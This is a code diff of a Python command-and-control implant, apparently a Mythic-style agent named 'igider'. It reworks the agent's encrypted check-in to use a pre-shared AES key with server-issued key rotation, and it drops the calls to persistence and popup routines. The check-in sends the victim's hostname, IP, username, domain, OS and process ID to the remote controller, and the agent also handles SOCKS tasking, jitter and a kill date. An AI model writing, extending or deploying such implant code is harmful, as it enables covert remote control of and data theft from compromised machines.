@@ -157,118 +157,62 @@ CRYPTO_MODULE_PLACEHOLDER
             for packet in tasking_data["socks"]: self.socks_in.put(packet)
 
     
-    def perform_key_exchange(self):
-        """Perform initial key exchange with server - no encryption needed"""
-        try:
-            data = {
-                "action": "key_exchange",
-                "uuid": self.agent_config["PayloadUUID"]
-            }
-            # Send unencrypted key exchange request
-            message_data = self.agent_config["PayloadUUID"].encode() + json.dumps(data).encode()
-            encoded_data = base64.b64encode(message_data)
-            print(f"Performing key exchange with encoded_data {encoded_data}")
-            response = self.makeRequest(encoded_data, 'POST')
-            
-            if not response:
-                print("No response received during key exchange")
-                return False
-                
-            # Decode response (should be unencrypted)
-            try:
-                decoded_response = base64.b64decode(response)
-                response_json = json.loads(decoded_response.decode())
-            except Exception as e:
-                print(f"Failed to decode key exchange response: {str(e)}")
-                return False
-                
-            # Validate and store keys
-            if (response_json.get("action") == "key_exchange_response" and 
-                response_json.get("status") == "success"):
-                
-                self.agent_config["agent_to_server_key"] = response_json["encryption_key"]
-                self.agent_config["server_to_agent_key"] = response_json["decryption_key"]
-                
-                print("Key exchange successful")
-                print(f"Agent-to-server key: {self.agent_config['agent_to_server_key'][:10]}...")
-                print(f"Server-to-agent key: {self.agent_config['server_to_agent_key'][:10]}...")
-                return True
-            else:
-                print(f"Invalid key exchange response: {response_json}")
-                return False
-                
-        except Exception as e:
-            print(f"Key exchange failed: {str(e)}")
-            return False
-
     def checkIn(self):
-        """Perform encrypted checkin after key exchange is complete"""
-        try:
-            # Ensure we have encryption keys
-            if not self.agent_config.get("agent_to_server_key") or not self.agent_config.get("server_to_agent_key"):
-                print("Cannot checkin without encryption keys")
-                return False
-                
-            hostname = socket.gethostname()
-            ip = ''
-            if hostname and len(hostname) > 0:
-                try:
-                    ip = socket.gethostbyname(hostname)
-                except:
-                    pass
+        hostname = socket.gethostname()
+        ip = socket.gethostbyname(hostname) if hostname else ''
 
-            data = {
-                "action": "checkin",
-                "ip": ip,
-                "os": self.getOSVersion(),
-                "user": self.getUsername(),
-                "host": hostname,
-                "domain": socket.getfqdn(),
-                "pid": os.getpid(),
-                "uuid": self.agent_config["PayloadUUID"],
-                "architecture": "x64" if sys.maxsize > 2**32 else "x86",
-            }
-            
-            # Use the formatMessage method which handles encryption and UUID prepending
-            encoded_data = self.formatMessage(data)
-            if not encoded_data:
-                print("Failed to format checkin message")
-                return False
-                
-            response = self.makeRequest(encoded_data, 'POST')
-            if not response:
-                print("No response received from checkin request")
-                return False
-                
-            # Decrypt and parse response
-            decoded_data = self.decrypt(response)
-            if not decoded_data:
-                print("Failed to decrypt checkin response")
-                return False
-                
-            try:
-                # Remove UUID prefix from response
-                json_str = decoded_data.decode()
-                if json_str.startswith(self.agent_config["PayloadUUID"]):
-                    json_str = json_str.replace(self.agent_config["PayloadUUID"], "", 1)
-                    
-                response_json = json.loads(json_str)
-                
-                if "status" in response_json and "id" in response_json:
-                    self.agent_config["UUID"] = response_json["id"]
-                    print(f"Checkin successful, assigned UUID: {self.agent_config['UUID']}")
-                    return True
-                else:
-                    print(f"Invalid checkin response: {response_json}")
-                    return False
-                    
-            except json.JSONDecodeError as e:
-                print(f"Failed to parse checkin response: {str(e)}")
-                return False
-                
-        except Exception as e:
-            print(f"Checkin failed: {str(e)}")
+        data = {
+            "action": "checkin",
+            "ip": ip,
+            "os": self.getOSVersion(),
+            "user": self.getUsername(),
+            "host": hostname,
+            "domain": socket.getfqdn(),
+            "pid": os.getpid(),
+            "uuid": self.agent_config["PayloadUUID"],
+            "architecture": "x64" if sys.maxsize > 2**32 else "x86"
+            # Removed static keys from initial checkin
+        }
+
+        # Encrypt with initial static key
+        encrypted_data = self.encrypt(json.dumps(data).encode())
+        encoded_data = base64.b64encode(self.agent_config["PayloadUUID"].encode() + encrypted_data)
+        
+        # Send initial checkin
+        response = self.makeRequest(encoded_data, 'POST')
+        if not response:
             return False
+
+        # Decrypt response with static key
+        decrypted_response = self.decrypt(response)
+        if not decrypted_response:
+            return False
+
+        try:
+            # Remove UUID prefix and parse JSON
+            json_response = decrypted_response.replace(self.agent_config["PayloadUUID"], "", 1)
+            response_data = json.loads(json_response)
+            
+            if response_data.get("status") == "success":
+                # Extract new keys from response
+                new_enc_key = base64.b64decode(response_data["enc_key"])
+                new_dec_key = base64.b64decode(response_data["dec_key"])
+                
+                # Debug output
+                print(f"[Agent] Received new enc key: {base64.b64encode(new_enc_key).decode('utf-8')}")
+                print(f"[Agent] Received new dec key: {base64.b64encode(new_dec_key).decode('utf-8')}")
+                
+                # Update agent configuration with new keys
+                self.agent_config["enc_key"] = {
+                    "enc_key": new_enc_key,
+                    "dec_key": new_dec_key
+                }
+                self.agent_config["UUID"] = response_data["id"]
+                return True
+        except Exception as e:
+            print(f"[Agent] Key update error: {str(e)}")
+        
+        return False
         
     def makeRequest(self, data, method='GET', max_retries=5, retry_delay=5):
         # Build headers
@@ -382,8 +326,7 @@ CRYPTO_MODULE_PLACEHOLDER
             "Sleep": callback_interval,
             "Jitter": callback_jitter,
             "KillDate": "killdate",
-            "Server-to-agent key": "",
-            "Agent-to-server key": "",
+            "enc_key": AESPSK,
             "ExchChk": "encrypted_exchange_check",
             "GetURI": "/get_uri",
             "GetParam": "query_path_name",
@@ -392,18 +335,12 @@ CRYPTO_MODULE_PLACEHOLDER
             "ProxyPass": "proxy_pass",
             "ProxyPort": "proxy_port",
         }
-        self.perform_key_exchange()
         max_checkin_retries = 10
         checkin_retry_delay = 30
 
         # Attempt initial check-in with retries
         for attempt in range(max_checkin_retries):
             if self.checkIn():
-                try:
-                    self.create_persistence()
-                    self.show_console_popup()
-                except Exception as e:
-                    pass
                 break
             if attempt < max_checkin_retries - 1:
                 time.sleep(checkin_retry_delay)
@@ -436,7 +373,7 @@ CRYPTO_MODULE_PLACEHOLDER
                             pass
                     self.agentSleep()   
         except KeyboardInterrupt:
-            self.exit(0)               
+            self.exit(0)                
 
 if __name__ == "__main__":
     igider = igider()
